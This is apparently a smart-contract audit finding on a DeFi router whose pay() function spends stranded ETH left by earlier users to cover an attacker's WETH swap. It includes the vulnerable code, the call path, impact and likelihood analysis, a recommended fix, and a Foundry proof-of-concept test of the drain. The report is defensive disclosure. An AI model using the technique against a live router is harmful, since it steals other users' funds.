### Title
Router Residual ETH Subsidizes Attacker's WETH Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses `address(this).balance` — the router's **entire** native ETH balance — when settling a WETH-denominated swap. Because that balance includes ETH left over from any prior transaction (e.g., a user who sent excess `msg.value` and omitted `refundETH()`), an attacker can call `exactInputSingle({tokenIn: WETH})` and have the router's residual ETH cover all or part of the required payment, receiving swap output while paying less than `amountIn` from their own wallet.

---

### Finding Description

The hybrid WETH branch in `pay()` reads the router's live ETH balance unconditionally:

```solidity
// PeripheryPayments.sol L73-84
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← entire router balance
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`address(this).balance` is not scoped to the ETH sent with the **current** call. Any ETH that arrived in a prior transaction and was not swept by `refundETH()` is silently consumed.

The callback path that reaches `pay()` for a single-hop exact-input swap is:

```
exactInputSingle (payer = msg.sender, token = tokenIn = WETH)
  → pool.swap()
    → metricOmmSwapCallback()
      → _justPayCallback()
        → pay(WETH, msg.sender, pool, amountOwed)
``` [2](#0-1) [3](#0-2) 

ETH accumulates on the router whenever a user calls any `payable` entry-point (e.g., `exactInputSingle`, `multicall`) with `msg.value` exceeding the actual swap cost and does not append a `refundETH()` call. The `receive()` guard only blocks direct ETH pushes from non-WETH addresses; it does not prevent `msg.value` overpayment. [4](#0-3) 

---

### Impact Explanation

**Direct loss of stranded ETH.** The residual ETH belongs to the user who overpaid. An attacker who calls `exactInputSingle({tokenIn: WETH, amountIn: R})` when the router holds `R` wei of residual ETH:

- pays **zero** WETH from their own wallet (the `safeTransferFrom` branch is never reached),
- receives the full swap output from the pool,
- drains the victim's stranded ETH in a single public transaction.

The partial-subsidy branch (`0 < nativeBalance < value`) allows the attacker to reduce their out-of-pocket cost proportionally. In both cases the invariant *"payer funds the full swap cost"* is violated.

---

### Likelihood Explanation

ETH stranding is a realistic, recurring condition:

1. Users routinely send a round `msg.value` slightly above `amountIn` to avoid reverts, then omit `refundETH()`.
2. Multi-hop `exactInput` with `msg.value` overpayment leaves residual ETH after the first hop's callback.
3. Any MEV bot or on-chain monitor watching the router's ETH balance can atomically exploit the next block.

No privileged role, malicious pool, or non-standard token is required. The attacker only needs a valid pool address and a WETH allowance of zero.

---

### Recommendation

Scope the ETH available for payment to the ETH sent with the **current call** only. One approach: capture `msg.value` at entry and pass it through to `pay()`, or track a per-call "ETH budget" in transient storage and decrement it as ETH is consumed. Alternatively, restrict the hybrid WETH branch to `payer == address(this)` (mid-path hops) and require external callers to always use `safeTransferFrom`, relying on `multicall` + `refundETH()` for the ETH-in / WETH-out pattern.

### Proof of Concept

```solidity
// Foundry unit test sketch
function test_residualEthSubsidizesAttacker() public {
    // 1. Seed router with residual ETH (simulates a prior user overpayment)
    uint256 residual = 1 ether;
    vm.deal(address(weth), residual);
    // WETH sends ETH to router via withdraw (receive() allows it)
    vm.prank(address(weth));
    (bool ok,) = address(router).call{value: residual}("");
    require(ok);

    // 2. Attacker has zero WETH, zero ETH, but a valid pool exists for WETH→TOKEN
    address attacker = makeAddr("attacker");
    uint256 attackerWethBefore = weth.balanceOf(attacker);

    // 3. Attacker calls exactInputSingle with tokenIn=WETH, amountIn=residual
    vm.prank(attacker);
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: pool,
            tokenIn: address(weth),
            recipient: attacker,
            amountIn: uint128(residual),
            amountOutMinimum: 0,
            zeroForOne: true,
            priceLimitX64: 0,
            deadline: block.timestamp,
            extensionData: ""
        })
    );

    // 4. Assert: attacker paid nothing from their own balance
    assertEq(weth.balanceOf(attacker), attackerWethBefore, "attacker spent own WETH");
    // 5. Assert: router ETH is now zero (stolen)
    assertEq(address(router).balance, 0, "residual ETH not drained");
    // 6. Assert: attacker received token output
    assertGt(token.balanceOf(attacker), 0, "attacker got output");
}
```

The test demonstrates that `pay()` consumes `address(this).balance` (the seeded residual ETH) rather than pulling from the attacker's WETH allowance, satisfying the proof requirement.
